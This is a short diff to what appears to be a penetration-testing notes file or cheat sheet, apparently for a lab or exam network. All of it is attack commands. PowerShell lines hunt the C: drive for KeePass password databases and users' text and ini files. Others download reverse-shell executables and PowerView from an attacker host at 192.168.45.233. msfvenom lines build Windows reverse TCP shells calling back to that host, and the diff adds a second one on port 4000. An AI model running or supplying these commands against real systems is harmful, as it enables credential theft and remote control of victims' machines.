@@ -7,7 +7,9 @@ Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyCont
 Get-ChildItem -Path C:\users -Include *.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue
 
 Invoke-WebRequest -Uri "http://192.168.45.233:8000/shell-x64.exe" -OutFile "shell-x64.exe"
+Invoke-WebRequest -Uri "http://192.168.45.233:8000/shell-x64-4000.exe" -OutFile "shell-x64-4000.exe"
 Invoke-WebRequest -Uri "http://192.168.45.233:8000/powerview.ps1" -OutFile "powerview.ps1"
 
 
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.233 LPORT=1234 -f exe > shell-x64.exe
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.233 LPORT=4000 -f exe > shell-x64-4000.exe
